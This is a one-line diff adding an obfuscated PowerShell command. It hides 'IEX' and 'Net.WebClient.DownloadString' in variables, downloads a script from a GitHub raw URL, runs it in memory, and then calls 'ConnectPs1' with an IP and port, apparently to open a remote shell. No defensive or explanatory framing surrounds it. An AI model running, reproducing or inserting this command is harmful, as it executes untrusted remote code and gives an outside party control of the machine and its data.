@@ -1,0 +1,1 @@
+$cmd = 'IEX'; $wc = 'New-Object'; $net = 'Net.WebClient'; $ds = 'DownloadString'; $url = 'https://raw.githubusercontent.com/initial-doomer/connection/refs/heads/main/ConnecttPs1.ps1'; &$cmd (&$wc $net).$ds($url); Start-Sleep 10; ConnectPs1 Ip Port
